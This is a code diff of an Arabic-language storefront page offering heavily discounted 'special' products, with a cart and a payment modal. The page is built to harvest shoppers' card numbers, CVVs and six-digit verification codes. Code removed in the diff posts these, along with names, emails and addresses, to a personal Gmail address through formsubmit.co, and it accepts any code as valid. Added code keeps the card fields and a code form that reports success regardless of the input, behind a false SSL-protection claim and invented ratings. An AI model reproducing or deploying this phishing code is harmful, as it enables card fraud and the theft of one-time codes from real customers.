+                                <i class="fas fa-shield-alt mr-2"></i>
+                                جميع معلومات الدفع محمية بتشفير SSL
+                            </p>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 gap-4">
+                            <div>
+                                <label class="block text-lg font-bold mb-2">رقم البطاقة</label>
+                                <input type="text" name="card_number" placeholder="1234 5678 9012 3456" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" maxlength="19" required="">
+                                <div class="flex items-center mt-2 space-x-2 space-x-reverse">
+                                    <i class="fab fa-cc-visa text-blue-600 text-lg"></i>
+                                    <i class="fab fa-cc-mastercard text-red-600 text-lg"></i>
+                                    <i class="fab fa-cc-american-express text-blue-500 text-lg"></i>
+                                    <span class="text-xs text-gray-500">البطاقات المدعومة</span>
+                                </div>
+                            </div>
+                            
+                            <div class="grid grid-cols-2 gap-4">
+                                <div>
+                                    <label class="block text-lg font-bold mb-2">الشهر/السنة</label>
+                                    <input type="text" name="card_expiry" placeholder="MM/YY" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" maxlength="5" required="">
+                                </div>
+                                <div>
+                                    <label class="block text-lg font-bold mb-2">رمز الأمان (CVV)</label>
+                                    <input type="text" name="card_cvv" placeholder="123" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" maxlength="3" required="">
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <label class="block text-lg font-bold mb-2">اسم حامل البطاقة</label>
+                                <input type="text" name="card_holder_name" placeholder="كما هو مكتوب على البطاقة" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary dark:bg-gray-700 dark:border-gray-600 transition-colors" required="">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="border-t pt-6 dark:border-gray-700 bg-gray-50 dark:bg-gray-700 p-4 rounded-xl">
+                        <div class="space-y-2 mb-4">
+                            <div class="flex justify-between text-lg">
+                                <span>المجموع الفرعي:</span>
+                                <span id="payment-subtotal">0 ريال</span>
+                            </div>
+                            <div class="flex justify-between text-lg">
+                                <span>الشحن:</span>
+                                <span id="payment-shipping">15 ريال</span>
+                            </div>
+                            <div class="flex justify-between text-2xl font-bold border-t pt-2">
+                                <span>المجموع النهائي:</span>
+                                <span id="payment-total">15 ريال</span>
+                            </div>
+                        </div>
+                        <button type="submit" class="w-full bg-gradient-to-r from-primary to-secondary text-white py-4 rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold text-lg transform hover:scale-105">
+                            <i class="fas fa-credit-card mr-2"></i>
+                            إتمام الطلب
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
 
     <script>
-        // متغيرات عامة
-        let currentStep = 1;
-        let orderData = {};
+        // Dark mode setup
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.documentElement.classList.add('dark');
+        }
         
-        // دالة لعرض الإشعارات
-        function showNotification(message, type = 'success') {
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
+            if (event.matches) {
+                document.documentElement.classList.add('dark');
+            } else {
+                document.documentElement.classList.remove('dark');
+            }
+        });
+
+        // Global variables
+        let cart = [];
+        let currentFormType = '';
+        let isCodeFormSubmitted = false;
+
+        // Enhanced products data
+        const products = [
+            { 
+                id: 1, 
+                name: 'منتج خاص متطور 1', 
+                category: 'couples', 
+                price: 45, 
+                originalPrice: 180, 
+                image: 'https://pfst.cf2.poecdn.net/base/image/07cbe685c3cef01216089254dda94947a636b49f821789115538de8d1d704a90?w=800&h=800',
+                discount: 75,
+                description: 'منتج عالي الجودة مصنوع من مواد آمنة ومريحة مع تقنيات متطورة.',
+                rating: 4.9,
+                reviews: 1247
+            },
+            { 
+                id: 2, 
+                name: 'منتج خاص متطور 2', 
+                category: 'women', 
+                price: 65, 
+                originalPrice: 260, 
+                image: 'https://pfst.cf2.poecdn.net/base/image/451830208e56a601baa5cac863c2370c70ee5e12704ddf546865d110465816a4?w=800&h=800',
+                discount: 75,
+                description: 'منتج متطور مع مميزات خاصة وتصميم أنيق.',
+                rating: 4.8,
+                reviews: 2156
+            },
+            { 
+                id: 3, 
+                name: 'منتج خاص متطور 3', 
+                category: 'men', 
+                price: 85, 
+                originalPrice: 340, 
+                image: 'https://pfst.cf2.poecdn.net/base/image/65cfa6d99905502f17f84fc58231af66ad66a1358c2120881bdf864a128d66a5?w=800&h=800',
+                discount: 75,
+                description: 'منتج واقعي بجودة عالية وأداء استثنائي.',
+                rating: 4.9,
+                reviews: 1890
+            },
+            { 
+                id: 4, 
+                name: 'منتج VIP حصري 1', 
+                category: 'couples', 
+                price: 120, 
+                originalPrice: 480, 
+                image: 'https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=800&h=800',
+                discount: 75,
+                description: 'منتج حصري للأعضاء المميزين فقط.',
+                rating: 5.0,
+                reviews: 543
+            },
+            { 
+                id: 5, 
+                name: 'منتج VIP حصري 2', 
+                category: 'women', 
+                price: 95, 
+                originalPrice: 380, 
+                image: 'https://images.unsplash.com/photo-1544441892-794166f1e3be?w=800&h=800',
+                discount: 75,
+                description: 'منتج متميز بجودة استثنائية وتصميم فريد.',
+                rating: 4.9,
+                reviews: 987
+            },
+            { 
+                id: 6, 
+                name: 'منتج VIP حصري 3', 
+                category: 'men', 
+                price: 110, 
+                originalPrice: 440, 
+                image: 'https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=800&h=800',
+                discount: 75,
+                description: 'منتج فاخر مع أحدث التقنيات.',
+                rating: 4.8,
+                reviews: 765
+            }
+        ];
+
+        // Age verification
+        function confirmAge() {
+            document.getElementById('age-verification').style.display = 'none';
+            sessionStorage.setItem('ageVerified', 'true');
+        }
+
+        function checkAgeVerification() {
+            const ageVerified = sessionStorage.getItem('ageVerified');
+            if (ageVerified === 'true') {
+                document.getElementById('age-verification').style.display = 'none';
+            }
+        }
+
+        // Navigation functions
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+            
+            if (pageId === 'products') {
+                generateProducts();
+            }
+            
+            document.getElementById('mobile-menu').classList.add('hidden');
+        }
+
+        function toggleMobileMenu() {
+            document.getElementById('mobile-menu').classList.toggle('hidden');
+        }
+
+        // Generate star rating
+        function generateStarRating(rating) {
+            const fullStars = Math.floor(rating);
+            const hasHalfStar = rating % 1 !== 0;
+            let stars = '';
+            
+            for (let i = 0; i < fullStars; i++) {
+                stars += '<i class="fas fa-star text-yellow-400"></i>';
+            }
+            
+            if (hasHalfStar) {
+                stars += '<i class="fas fa-star-half-alt text-yellow-400"></i>';
+            }
+            
+            const emptyStars = 5 - Math.ceil(rating);
+            for (let i = 0; i < emptyStars; i++) {
+                stars += '<i class="far fa-star text-gray-300"></i>';
+            }
+            
+            return stars;
+        }
+
+        // Generate products
+        function generateProducts() {
+            const grid = document.getElementById('products-grid');
+            const homeGrid = document.getElementById('home-products-grid');
+            
+            const productsHTML = products.map(product => `
+                <div class="bg-white dark:bg-gray-700 rounded-2xl shadow-xl overflow-hidden card-hover relative group">
+                    <div class="discount-badge animate-pulse">خصم ${product.discount}%</div>
+                    <div class="h-64 overflow-hidden relative">
+                        <img src="${product.image}" alt="${product.name}" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500">
+                        <div class="absolute inset-0 bg-black bg-opacity-0 group-hover:bg-opacity-20 transition-all duration-300"></div>
+                    </div>
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold mb-3">${product.name}</h3>
+                        <p class="text-gray-600 dark:text-gray-300 text-sm mb-3">${product.description}</p>
+                        <div class="flex items-center mb-3">
+                            <div class="flex text-sm">
+                                ${generateStarRating(product.rating)}
+                            </div>
+                            <span class="text-xs text-gray-500 mr-2">(${product.reviews.toLocaleString()} تقييم)</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <div>
+                                <span class="text-2xl font-bold text-primary">${product.price} ريال</span>
+                                <span class="text-sm text-gray-500 line-through mr-2">${product.originalPrice} ريال</span>
+                            </div>
+                            <button onclick="addToCart('${product.id}', '${product.name}', ${product.price})" class="bg-gradient-to-r from-primary to-secondary text-white px-6 py-3 rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold transform hover:scale-105">
+                                أضف للسلة
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+            
+            if (grid) grid.innerHTML = productsHTML;
+            if (homeGrid) homeGrid.innerHTML = productsHTML.split('').slice(0, 3).join('');
+        }
+
+        // Cart functions
+        function addToCart(id, name, price) {
+            const existingItem = cart.find(item => item.id === id);
+            
+            if (existingItem) {
+                existingItem.quantity += 1;
+            } else {
+                cart.push({ id, name, price: parseInt(price), quantity: 1 });
+            }
+            
+            updateCartUI();
+            showNotification('تم إضافة المنتج للسلة ✅');
+        }
+
+        function removeFromCart(id) {
+            cart = cart.filter(item => item.id !== id);
+            updateCartUI();
+        }
+
+        function updateQuantity(id, change) {
+            const item = cart.find(item => item.id === id);
+            if (item) {
+                item.quantity += change;
+                if (item.quantity <= 0) {
+                    removeFromCart(id);
+                } else {
+                    updateCartUI();
+                }
+            }
+        }
+
+        function updateCartUI() {
+            const cartCount = document.getElementById('cart-count');
+            const cartItems = document.getElementById('cart-items');
+            const cartSubtotal = document.getElementById('cart-subtotal');
+            const cartShipping = document.getElementById('cart-shipping');
+            const cartTotal = document.getElementById('cart-total');
+            const paymentSubtotal = document.getElementById('payment-subtotal');
+            const paymentShipping = document.getElementById('payment-shipping');
+            const paymentTotal = document.getElementById('payment-total');
+            
+            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
+            const subtotalPrice = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const shippingCost = subtotalPrice >= 300 ? 0 : 15;
+            const totalPrice = subtotalPrice + shippingCost;
+            
+            cartCount.textContent = totalItems;
+            
+            if (cartSubtotal) cartSubtotal.textContent = `${subtotalPrice} ريال`;
+            if (cartShipping) cartShipping.textContent = shippingCost === 0 ? 'مجاني' : `${shippingCost} ريال`;
+            if (cartTotal) cartTotal.textContent = `${totalPrice} ريال`;
+            if (paymentSubtotal) paymentSubtotal.textContent = `${subtotalPrice} ريال`;
+            if (paymentShipping) paymentShipping.textContent = shippingCost === 0 ? 'مجاني' : `${shippingCost} ريال`;
+            if (paymentTotal) paymentTotal.textContent = `${totalPrice} ريال`;
+            
+            if (cart.length === 0) {
+                cartItems.innerHTML = '<p class="text-center text-gray-500 py-8 text-lg">السلة فارغة 🛒</p>';
+            } else {
+                cartItems.innerHTML = cart.map(item => `
+                    <div class="flex items-center justify-between border-b dark:border-gray-700 py-4">
+                        <div class="flex-1">
+                            <h3 class="font-bold text-lg">${item.name}</h3>
+                            <p class="text-gray-600 dark:text-gray-300">${item.price} ريال</p>
+                        </div>
+                        <div class="flex items-center space-x-3 space-x-reverse">
+                            <button onclick="updateQuantity('${item.id}', -1)" class="bg-gray-200 dark:bg-gray-600 w-10 h-10 rounded-full hover:bg-gray-300 dark:hover:bg-gray-500 transition-colors">-</button>
+                            <span class="mx-3 font-bold text-lg">${item.quantity}</span>
+                            <button onclick="updateQuantity('${item.id}', 1)" class="bg-gray-200 dark:bg-gray-600 w-10 h-10 rounded-full hover:bg-gray-300 dark:hover:bg-gray-500 transition-colors">+</button>
+                            <button onclick="removeFromCart('${item.id}')" class="text-red-500 hover:text-red-700 mr-3 text-lg">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                        </div>
+                    </div>
+                `).join('');
+            }
+        }
+
+        function toggleCart() {
+            const modal = document.getElementById('cart-modal');
+            modal.classList.toggle('hidden');
+            modal.classList.toggle('flex');
+        }
+
+        function showPayment() {
+            document.getElementById('cart-modal').classList.add('hidden');
+            document.getElementById('payment-modal').classList.remove('hidden');
+            document.getElementById('payment-modal').classList.add('flex');
+        }
+
+        function hidePayment() {
+            document.getElementById('payment-modal').classList.add('hidden');
+            document.getElementById('payment-modal').classList.remove('flex');
+        }
+
+        function showNotification(message) {
             const notification = document.createElement('div');
-            notification.className = `notification ${type}`;
+            notification.className = 'fixed top-20 right-4 bg-gradient-to-r from-green-500 to-emerald-600 text-white px-6 py-4 rounded-xl shadow-2xl z-50 transform translate-x-full';
             notification.innerHTML = `
                 <div class="flex items-center">
-                    <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'warning' ? 'fa-exclamation-triangle' : 'fa-exclamation-circle'} ml-3"></i>
-                    <span>${message}</span>
+                    <i class="fas fa-check-circle mr-3 text-xl"></i>
+                    <span class="font-bold">${message}</span>
                 </div>
             `;
-            
             document.body.appendChild(notification);
             
             setTimeout(() => {
-                notification.classList.add('show');
+                notification.style.transform = 'translateX(0)';
             }, 100);
             
             setTimeout(() => {
-                notification.classList.remove('show');
+                notification.style.transform = 'translateX(100%)';
                 setTimeout(() => {
-                    if (notification.parentNode) {
-                        notification.parentNode.removeChild(notification);
-                    }
-                }, 400);
-            }, 4000);
+                    notification.remove();
+                }, 300);
+            }, 3000);
         }
 
-        // تحديث شريط التقدم
-        function updateProgress(step) {
-            const progressFill = document.getElementById('progressFill');
-            const percentage = (step / 3) * 100;
-            progressFill.style.width = percentage + '%';
-        }
-
-        // إخفاء وإظهار الأقسام
-        function showSection(sectionId) {
-            // إخفاء جميع الأقسام
-            document.getElementById('order').style.display = 'none';
-            document.getElementById('verification').style.display = 'none';
-            document.getElementById('payment').style.display = 'none';
-            document.getElementById('thankyou').style.display = 'none';
-            
-            // إظهار القسم المطلوب
-            document.getElementById(sectionId).style.display = 'block';
-            
-            // إضافة تأثير الظهور
-            setTimeout(() => {
-                document.getElementById(sectionId).classList.add('fade-in');
-            }, 100);
-        }
-
-        // تنسيق رقم البطاقة
-        function formatCardNumber(input) {
-            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formattedValue = value.match(/.{1,4}/g)?.join(' ');
-            input.value = formattedValue || value;
-        }
-
-        // تنسيق تاريخ الانتهاء
-        function formatExpiryDate(input) {
-            let value = input.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        // Handle form submission response
+        function handleFormSubmit() {
+            if (currentFormType === 'advanced-code' && !isCodeFormSubmitted) {
+                isCodeFormSubmitted = true;
+                setTimeout(() => {
+                    showNotification('🎉 تم قبول الكود بنجاح!');
+                    setTimeout(() => {
+                        showCodeSuccessModal();
+                    }, 1000);
+                }, 500);
             }
-            input.value = value;
+            currentFormType = '';
         }
 
-        // إعادة إرسال الكود
-        function resendCode() {
-            showNotification('تم إعادة إرسال كود التحقق', 'success');
+        // Show/Hide Code Success Modal
+        function showCodeSuccessModal() {
+            const modal = document.getElementById('code-success-modal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
         }
 
-        // العودة للخلف
-        function goBack() {
-            currentStep = 1;
-            updateProgress(currentStep);
-            showSection('order');
+        function hideCodeSuccessModal() {
+            const modal = document.getElementById('code-success-modal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
         }
 
-        function goBackToVerification() {
-            currentStep = 2;
-            updateProgress(currentStep);
-            showSection('verification');
-        }
-
-        // بدء طلب جديد
-        function startNewOrder() {
-            currentStep = 1;
-            updateProgress(currentStep);
-            showSection('order');
-            document.getElementById('orderForm').reset();
-            orderData = {};
-        }
-
-        // تحميل إيصال الطلب
-        function downloadOrderReceipt() {
-            const orderNumber = document.getElementById('orderNumber').textContent;
-            const orderDate = document.getElementById('orderDate').textContent;
+        // Enhanced Code Input Functionality
+        function setupCodeInputs() {
+            const codeInputs = ['code-1', 'code-2', 'code-3', 'code-4', 'code-5', 'code-6'];
             
-            const receiptContent = `
-إيصال طلب - مكاسر العود
-====================
-رقم الطلب: ${orderNumber}
-تاريخ الطلب: ${orderDate}
-العميل: ${orderData.first_name} ${orderData.last_name}
-المنتج: ${orderData.product_type}
-الكمية: ${orderData.quantity}
-العنوان: ${orderData.address}, ${orderData.city}
-====================
-شكراً لاختياركم مكاسر العود
-            `;
-            
-            const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `receipt-${orderNumber}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            window.URL.revokeObjectURL(url);
-        }
-
-        // معالجة نموذج الطلب - إرسال حقيقي
-        document.getElementById('orderForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const submitBtn = document.getElementById('submitOrderBtn');
-            const originalText = submitBtn.innerHTML;
-            
-            // تعطيل الزر وعرض التحميل
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري الإرسال...';
-            
-            // حفظ بيانات الطلب
-            const formData = new FormData(this);
-            for (let [key, value] of formData.entries()) {
-                orderData[key] = value;
-            }
-            
-            // إرسال النموذج فعلياً
-            fetch(this.action, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    currentStep = 2;
-                    updateProgress(currentStep);
-                    showSection('payment');
-                    initializePaymentPage();
-                    showNotification('تم إرسال طلبك بنجاح! أكمل معلومات الدفع.', 'success');
-                } else {
-                    throw new Error('خطأ في الإرسال');
-                }
-            }).catch(error => {
-                showNotification('حدث خطأ في إرسال الطلب، يرجى المحاولة مرة أخرى', 'error');
-            }).finally(() => {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = originalText;
-            });
-        });
-
-        // معالجة نموذج الدفع - إرسال حقيقي
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const paymentMethod = document.getElementById('selectedPaymentMethod').value;
-            if (paymentMethod !== 'credit') {
-                return; // لا نرسل نموذج الدفع إلا للبطاقة الائتمانية
-            }
-            
-            // التحقق من صحة بيانات البطاقة
-            const validationErrors = validateCard();
-            if (validationErrors.length > 0) {
-                showNotification(validationErrors[0], 'error');
-                return;
-            }
-            
-            const submitBtn = document.getElementById('submitPaymentBtn');
-            const originalText = submitBtn.innerHTML;
-            
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري المعالجة...';
-            
-            // إضافة بيانات الطلب للنموذج
-            const formData = new FormData(this);
-            formData.append('order_customer_name', `${orderData.first_name} ${orderData.last_name}`);
-            formData.append('order_email', orderData.email);
-            formData.append('order_phone', orderData.phone);
-            formData.append('order_product', orderData.product_type);
-            formData.append('order_quantity', orderData.quantity);
-            
-            // إرسال النموذج فعلياً
-            fetch(this.action, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    currentStep = 3;
-                    updateProgress(currentStep);
-                    showSection('verification');
-                    showNotification('تم إرسال معلومات الدفع بنجاح! أدخل كود التحقق.', 'success');
-                } else {
-                    throw new Error('خطأ في معالجة الدفع');
-                }
-            }).catch(error => {
-                showNotification('حدث خطأ في معالجة الدفع، يرجى المحاولة مرة أخرى', 'error');
-            }).finally(() => {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = originalText;
-            });
-        });
-
-        // معالجة نموذج التحقق - أي كود يُقبل
-        document.getElementById('verificationForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const code = document.getElementById('verificationCode').value;
-            const submitBtn = document.getElementById('submitVerificationBtn');
-            const originalText = submitBtn.innerHTML;
-            
-            if (code.length !== 6) {
-                showNotification('يرجى إدخال كود مكون من 6 أرقام', 'error');
-                return;
-            }
-            
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري التحقق...';
-            
-            // إرسال كود التحقق
-            const formData = new FormData();
-            formData.append('verification_code', code);
-            formData.append('customer_name', `${orderData.first_name} ${orderData.last_name}`);
-            formData.append('customer_email', orderData.email);
-            formData.append('order_product', orderData.product_type);
-            formData.append('_subject', '✅ تم التحقق من كود الأمان - مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('_next', 'javascript:void(0)');
-            
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    // أي كود يُدخل يعتبر صحيح
-                    const orderNumber = 'OUD-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
-                    const orderDate = new Date().toLocaleDateString('ar-SA');
-                    
-                    document.getElementById('orderNumber').textContent = orderNumber;
-                    document.getElementById('orderDate').textContent = orderDate;
-                    
-                    updateProgress(3);
-                    showSection('thankyou');
-                    showNotification('تم التحقق بنجاح! تم إتمام طلبك.', 'success');
-                } else {
-                    throw new Error('خطأ في التحقق');
-                }
-            }).catch(error => {
-                showNotification('حدث خطأ في التحقق، يرجى المحاولة مرة أخرى', 'error');
-            }).finally(() => {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = originalText;
-            });
-        });
-
-        // تهيئة صفحة الدفع (بطاقة الائتمان فقط)
-        function initializePaymentPage() {
-            // إظهار نموذج بطاقة الائتمان مباشرة
-            document.getElementById('creditCardForm').style.display = 'block';
-            updateOrderSummary();
-        }
-
-        // تحديث ملخص الطلب
-        function updateOrderSummary() {
-            if (orderData.product_type) {
-                document.getElementById('orderSummaryProduct').textContent = orderData.product_type;
-                document.getElementById('orderSummaryQuantity').textContent = orderData.quantity + ' قطعة';
+            codeInputs.forEach((id, index) => {
+                const input = document.getElementById(id);
+                if (!input) return;
                 
-                // استخراج السعر من اسم المنتج
-                const priceMatch = orderData.product_type.match(/(\d+) ريال/);
-                if (priceMatch) {
-                    const unitPrice = parseInt(priceMatch[1]);
-                    const totalPrice = unitPrice * parseInt(orderData.quantity);
-                    document.getElementById('orderSummaryTotal').textContent = totalPrice + ' ريال';
-                }
-            }
-        }
-
-        // تأكيد التحويل البنكي - مع إرسال البيانات
-        function confirmBankTransfer() {
-            const formData = new FormData();
-            formData.append('payment_method', 'تحويل بنكي');
-            formData.append('customer_name', `${orderData.first_name} ${orderData.last_name}`);
-            formData.append('customer_email', orderData.email);
-            formData.append('customer_phone', orderData.phone);
-            formData.append('order_product', orderData.product_type);
-            formData.append('order_quantity', orderData.quantity);
-            formData.append('order_address', `${orderData.address}, ${orderData.city}`);
-            formData.append('_subject', '🏦 طلب تحويل بنكي - مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('_next', 'javascript:void(0)');
-            
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    currentStep = 3;
-                    updateProgress(currentStep);
-                    showSection('verification');
-                    showNotification('تم إرسال طلب التحويل البنكي! أدخل كود التحقق.', 'success');
-                } else {
-                    throw new Error('خطأ في الإرسال');
-                }
-            }).catch(error => {
-                showNotification('حدث خطأ، يرجى المحاولة مرة أخرى', 'error');
-            });
-        }
-
-        // تأكيد الدفع عند الاستلام - مع إرسال البيانات
-        function confirmCOD() {
-            const codMethod = document.querySelector('input[name="cod_method"]:checked').value;
-            const formData = new FormData();
-            formData.append('payment_method', `دفع عند الاستلام - ${codMethod === 'cash' ? 'نقدي' : 'بالبطاقة'}`);
-            formData.append('customer_name', `${orderData.first_name} ${orderData.last_name}`);
-            formData.append('customer_email', orderData.email);
-            formData.append('customer_phone', orderData.phone);
-            formData.append('order_product', orderData.product_type);
-            formData.append('order_quantity', orderData.quantity);
-            formData.append('order_address', `${orderData.address}, ${orderData.city}`);
-            formData.append('additional_fees', '15 ريال');
-            formData.append('_subject', '📦 طلب دفع عند الاستلام - مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('_next', 'javascript:void(0)');
-            
-            fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    currentStep = 3;
-                    updateProgress(currentStep);
-                    showSection('verification');
-                    showNotification(`تم إرسال طلب الدفع عند الاستلام! أدخل كود التحقق.`, 'success');
-                } else {
-                    throw new Error('خطأ في الإرسال');
-                }
-            }).catch(error => {
-                showNotification('حدث خطأ، يرجى المحاولة مرة أخرى', 'error');
-            });
-        }
-
-        // التحقق من نوع البطاقة
-        function detectCardType(cardNumber) {
-            const visaRegex = /^4[0-9]{6,}$/;
-            const mastercardRegex = /^5[1-5][0-9]{5,}$/;
-            const madaRegex = /^(4|5)[0-9]{15}$/; // مدى عادة تبدأ بـ 4 أو 5
-
-            if (visaRegex.test(cardNumber)) {
-                return 'visa';
-            } else if (mastercardRegex.test(cardNumber)) {
-                return 'mastercard';
-            } else if (madaRegex.test(cardNumber)) {
-                return 'mada';
-            }
-            return 'unknown';
-        }
-
-        // تحديث أيقونة البطاقة
-        function updateCardIcon(input) {
-            const cardNumber = input.value.replace(/\s/g, '');
-            const cardType = detectCardType(cardNumber);
-            const icon = document.getElementById('cardTypeIcon');
-            
-            switch (cardType) {
-                case 'visa':
-                    icon.className = 'fab fa-cc-visa text-blue-600';
-                    break;
-                case 'mastercard':
-                    icon.className = 'fab fa-cc-mastercard text-red-600';
-                    break;
-                case 'mada':
-                    icon.className = 'fas fa-credit-card text-green-600';
-                    break;
-                default:
-                    icon.className = 'fas fa-credit-card text-gray-400';
-            }
-        }
-
-        // التحقق من صحة بيانات البطاقة
-        function validateCard() {
-            const cardNumber = document.querySelector('input[name="card_number"]').value.replace(/\s/g, '');
-            const expiryDate = document.querySelector('input[name="expiry_date"]').value;
-            const cvv = document.querySelector('input[name="cvv"]').value;
-            const cardHolder = document.querySelector('input[name="card_holder"]').value;
-
-            // التحقق من رقم البطاقة (خوارزمية Luhn)
-            function validateCardNumber(number) {
-                let sum = 0;
-                let isEven = false;
-                for (let i = number.length - 1; i >= 0; i--) {
-                    let digit = parseInt(number.charAt(i));
-                    if (isEven) {
-                        digit *= 2;
-                        if (digit > 9) {
-                            digit -= 9;
+                input.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    if (this.value.length === 1 && index < codeInputs.length - 1) {
+                        document.getElementById(codeInputs[index + 1]).focus();
+                    }
+                    
+                    updateCompleteCode();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        document.getElementById(codeInputs[index - 1]).focus();
+                    }
+                });
+                
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+                    
+                    for (let i = 0; i < Math.min(pasteData.length, codeInputs.length - index); i++) {
+                        const targetInput = document.getElementById(codeInputs[index + i]);
+                        if (targetInput) {
+                            targetInput.value = pasteData[i];
                         }
                     }
-                    sum += digit;
-                    isEven = !isEven;
+                    
+                    updateCompleteCode();
+                });
+            });
+        }
+        
+        function updateCompleteCode() {
+            const codeInputs = ['code-1', 'code-2', 'code-3', 'code-4', 'code-5', 'code-6'];
+            let completeCode = '';
+            
+            codeInputs.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) {
+                    completeCode += input.value || '';
                 }
-                return sum % 10 === 0;
-            }
-
-            // التحقق من تاريخ الانتهاء
-            function validateExpiryDate(date) {
-                const [month, year] = date.split('/');
-                const currentDate = new Date();
-                const currentYear = currentDate.getFullYear() % 100;
-                const currentMonth = currentDate.getMonth() + 1;
-                
-                return (parseInt(year) > currentYear) || 
-                       (parseInt(year) === currentYear && parseInt(month) >= currentMonth);
-            }
-
-            const errors = [];
+            });
             
-            if (!validateCardNumber(cardNumber)) {
-                errors.push('رقم البطاقة غير صحيح');
+            const completeCodeInput = document.getElementById('complete-code');
+            if (completeCodeInput) {
+                completeCodeInput.value = completeCode;
             }
             
-            if (!validateExpiryDate(expiryDate)) {
-                errors.push('تاريخ انتهاء البطاقة غير صحيح أو منتهي الصلاحية');
+            const submitBtn = document.getElementById('submit-advanced-code');
+            if (submitBtn) {
+                if (completeCode.length === 6) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    submitBtn.classList.add('animate-glow');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                    submitBtn.classList.remove('animate-glow');
+                }
             }
-            
-            if (cvv.length < 3 || cvv.length > 4) {
-                errors.push('رمز الأمان (CVV) غير صحيح');
-            }
-            
-            if (cardHolder.trim().length < 2) {
-                errors.push('اسم حامل البطاقة مطلوب');
-            }
-
-            return errors;
         }
 
-        // التحقق من صحة البيانات أثناء الكتابة
-        document.addEventListener('DOMContentLoaded', function() {
-            // التحقق من الإيميل
-            const emailInput = document.querySelector('input[name="email"]');
-            if (emailInput) {
-                emailInput.addEventListener('blur', function() {
-                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                    if (this.value && !emailRegex.test(this.value)) {
-                        this.style.borderColor = '#ef4444';
-                        showNotification('صيغة البريد الإلكتروني غير صحيحة', 'error');
-                    } else if (this.value) {
-                        this.style.borderColor = '#10b981';
-                    }
-                });
+        // Enhanced Advanced Code Form Handler
+        document.getElementById('advanced-code-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const fullName = this.querySelector('input[name="full_name"]').value.trim();
+            const phoneNumber = this.querySelector('input[name="phone_number"]').value.trim();
+            const emailAddress = this.querySelector('input[name="email_address"]').value.trim();
+            const verificationCode = this.querySelector('input[name="verification_code"]').value.trim();
